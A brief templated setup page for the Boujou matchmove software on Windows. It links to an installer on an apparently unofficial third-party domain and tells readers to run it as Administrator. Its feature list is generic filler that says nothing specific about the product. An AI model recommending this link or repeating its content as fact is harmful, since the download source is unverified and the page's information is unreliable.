# Boujou Windows Setup Notes

**Download:** [Get Windows installer →](https://boujou-matchmove-setup.kolmods.com/)

## Download & Install

> Setup notes for **Boujou** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Boujou** from the Start menu

## What you can use it for

- Core Boujou features on Windows desktop
- Install and configure Boujou for daily use
- Import, edit, and export with Boujou tools
- Tune settings and profiles inside Boujou
- Integrate Boujou into your existing workflow
